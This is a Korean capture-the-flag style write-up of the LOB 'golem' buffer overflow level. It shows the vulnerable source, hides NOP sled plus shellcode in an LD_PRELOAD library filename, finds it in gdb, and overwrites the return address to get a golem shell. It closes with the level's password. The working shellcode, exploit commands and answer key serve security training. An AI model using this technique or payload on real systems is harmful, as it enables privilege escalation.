# Summary

이전 문제와 동일한 내용은 생략하고 추가된 내용만 다루었다.**

> 문제의 소스코드

```c
[skeleton@localhost skeleton]$ cat golem.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - golem
        - stack destroyer
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // stack destroyer!
        memset(buffer, 0, 44);
	memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
}
```

<br>

> 문제의 소스코드에서 추가된 내용을 살펴보자

- buffer 시작 지점에서부터 유저 영역 끝까지 0으로 초기화

<br>

이번 문제는 버퍼의 모든 유저 영역을 0으로 초기화 하므로 쉘 코드를 삽입할 마땅한 곳을 찾을 수 없다.

이전 문제에서 사용했던 방식처럼 버퍼의 마지막 영역도 사용이 불가능하다.

그럼 이 문제는 어떻게 접근해야 하는가..

<br>

이 문제는 [리눅스 공유 라이브러리][ld]에 대한 사전 지식을 필요로 한다.

시스템은 `argv`와 같은 인자 뿐만 아니라 **공유 라이브러리**를 메모리에 로드한다.

프로그램을 실행했을 때 `loader`는 해당 프로그램 구동에 필요한 공유 라이브러리를 찾는다.

<br>

이 문제에서 사용할 공유 라이브러리는 대표적으로 후킹(Hooking)에서 많이 사용되는

**LD_PRELOAD**라는 환경변수이다.

해당 변수가 설정되어 있는 경우 변수에 지정된 라이브러리를 최우선으로 메모리에 로드하게 된다.

이 환경변수 안에 쉘코드를 삽입해 리턴 값을 변경하여 문제를 해결할 수 있을 것이다.

<br>

# Analysis

먼저 바이너리가 동적 링크(dynamically linked)인지 확인이 필요하다.

다음과 같이 바이너리의 링크 상태를 확인할 수 있다.

```python
[skeleton@localhost skeleton]$ file golem
golem: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1, dynamically linked (uses shared libs), not stripped
```

<br>

다음 해당 바이너리가 참고하고 있는 공유 라이브러리 확인이 필요하다.

다음과 같이 해당 바이너리가 참고하는 공유 라이브러리(shared library)를 확인할 수 있다.

화살표 기준 좌측이 `link-name`이며 우측이 실제 경로를 나타내는 `real-name`이다.

```python
[skeleton@localhost skeleton]$ ldd golem
	libc.so.6 => /lib/libc.so.6 (0x40018000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
```

<br>

`test.c` 파일을 생성하여 `gcc`컴파일을 통해 `.so`파일을 만들고

LD_PRELOAD 환경변수 경로에 생성한 `.so`파일의 절대 경로를 지정한다.

```python
[skeleton@localhost skeleton]$ mkdir tmp
[skeleton@localhost skeleton]$ cd tmp
[skeleton@localhost tmp]$ touch test.c
[skeleton@localhost tmp]$ gcc -shared test.c -o test.so
[skeleton@localhost tmp]$ export LD_PRELOAD="/home/skeleton/tmp/test.so"
[skeleton@localhost tmp]$ ls
test.c  test.so
```

<br>

환경 변수 적용 테스트를 위해 임의의 `.c`파일을 생성해 컴파일하고 `ldd` 명령어로 공유 라이브러리 적용 여부를 확인하면

위에서 지정한 환경 변수가 정상적으로 지정되어 있는 것을 확인할 수 있다.

임의로 

```python
[skeleton@localhost tmp]$ vi a.c
[skeleton@localhost tmp]$ cat a.c
#include <stdio.h>
int main(){

	printf("testData");
	return 0;
}
[skeleton@localhost tmp]$ gcc a.c -o a
[skeleton@localhost tmp]$ ldd a
	/home/skeleton/tmp/test.so => /home/skeleton/tmp/test.so (0x40015000)
	libc.so.6 => /lib/libc.so.6 (0x4001a000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
[skeleton@localhost tmp]$ ls
a  a.c  test.c  test.so
```

<br>

다음은 `gdb`를 통해 공유 라이브러리가 메모리 어느 부분에 제대로 올라가는지 직접 눈으로 확인해보자.

유저 영역 특정 지점에 방금 전 환경 변수에 지정한 `.so`파일의 절대 경로가 메모리에 정상적으로 올라가 있는 것을 볼 수 있다.

***이 지점에 쉘코드를 삽입해 문제를 해결할 수 있을 것이다.***

```python
[skeleton@localhost tmp]$ gdb -q a
(gdb) b *main
Breakpoint 1 at 0x80483d0
(gdb) r
Starting program: /home/skeleton/tmp/a

Breakpoint 1, 0x80483d0 in main ()
(gdb) x/1000s 0xbffff000
(... 생략 ...)
0xbffff6b8:	 "\001"
0xbffff6ba:	 ""
0xbffff6bb:	 ""
0xbffff6bc:	 "$\b"
0xbffff6bf:	 "@�����u"
0xbffff6c7:	 "@"
0xbffff6c9:	 "p\001@�/"
0xbffff6cf:	 ""
0xbffff6d0:	 "h8\001@$���\0168"
0xbffff6db:	 "@�C\001@/home/skeleton/tmp/test.so"
0xbffff6fb:	 "@h8\001@\f\""
0xbffff703:	 "@/���"
0xbffff709:	 ""
0xbffff70a:	 ""
0xbffff70b:	 ""
0xbffff70c:	 ""
0xbffff70d:	 ""
```

<br>

이전 문제와 같이 파일명에 쉘코드를 삽입할 것이다.

이 경우 주의할 점은 전에도 언급했듯이 `0x2f`가 포함되지 않은 쉘코드를 사용해야한다.(`0x2f`는 `/`와 같으므로)

먼저 `unset`을 이용해 이전 환경 변수 적용을 해제하고 `.so`파일명에 `NOP+shellcode`를 삽입해준다.

삽입 후 `export`명령어로  환경 변수를 적용해주고 `ls`명령어가 제대로 실행되는지 확인한다.

*(환경 변수가 제대로 적용되지 않았을 경우 `ls`명령어 입력 시 에러가 날 것이다.)*

```python
[skeleton@localhost tmp]$ unset LD_PRELOAD
[skeleton@localhost tmp]$ mv test.so `python -c "print '\x90'*100+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`
[skeleton@localhost tmp]$ ls
[skeleton@localhost tmp]$ export LD_PRELOAD=/home/skeleton/tmp/`python -c "print '\x90'*100+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`
[skeleton@localhost tmp]$ ls
a
a.c
test.c
????????????????????????????????????????????????????????????????????????????????????????????????????�?^1ɱ2?l?�??�?u��?�����2�Qi00tii0cjo?�QT?�?�?�?
```

<br>

`gdb`를 통해 쉘코드가 삽입됐는지 확인한 결과 `NOP*100`+`shellcode`가 메모리에 제대로 올라가 있다.

```python
[skeleton@localhost tmp]$ gdb -q a
(gdb) b main
Breakpoint 1 at 0x80483d3
(gdb) r
Starting program: /home/skeleton/tmp/a

Breakpoint 1, 0x80483d3 in main ()
(gdb) x/10000s 0xbffff000
(... 생략 ...)
0xbffff594:	 "x\202\004\b"
0xbffff599:	 ""
0xbffff59a:	 ""
0xbffff59b:	 ""
0xbffff59c:	 "\001"
0xbffff59e:	 ""
0xbffff59f:	 ""
0xbffff5a0:	 "$\b"
0xbffff5a3:	 "@�����u"
0xbffff5ab:	 "@"
0xbffff5ad:	 "p\001@�/"
0xbffff5b3:	 ""
0xbffff5b4:	 "h8\001@\224���\0168"
0xbffff5bf:	 "@xD\001@/home/skeleton/tmp/", '\220' <repeats 100 times>, "�\021^1ɱ2\200l\016�\001\200�\001u��\005�����2�Qi00tii0cjo\212�QT\212�\232�\f�\201"
0xbffff66c:	 "h8\001@\f\""
0xbffff673:	 "@����"
0xbffff679:	 ""
0xbffff67a:	 ""
0xbffff67b:	 ""
0xbffff67c:	 ""
0xbffff67d:	 ""
0xbffff67e:	 ""
```

<br>

# Exploit

쉘코드 삽입까지 확인되었으니 바로 `exploit` 코드를 짜보자.

우선 원본 바이너리 파일의 경우 환경변수가 적용되어 있지 않으니 심볼릭 링크 파일을 새로 생성한다.

생성된 파일을 실행하면서 인자에  `ret`값을 위에서 쉘코드를 삽입한 주소`0xbffff5bf`로 준다.

```python
[skeleton@localhost skeleton]$ ln -s golem solve
[skeleton@localhost skeleton]$ ./solve `python -c "print 'A'*44+'\xbf\xf5\xff\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
bash$ id
uid=510(skeleton) gid=510(skeleton) euid=511(golem) egid=511(golem) groups=510(skeleton)
bash$ my-pass
euid = 511
cup of coffee
```

### Clear! password is….

Cup of coffee

[ld]: https://www.lesstif.com/pages/viewpage.action?pageId=12943542#id-동적라이브러리(sharedlibrary)와Linker/Loader이해하기-공유라이브러리(sharedlibrary)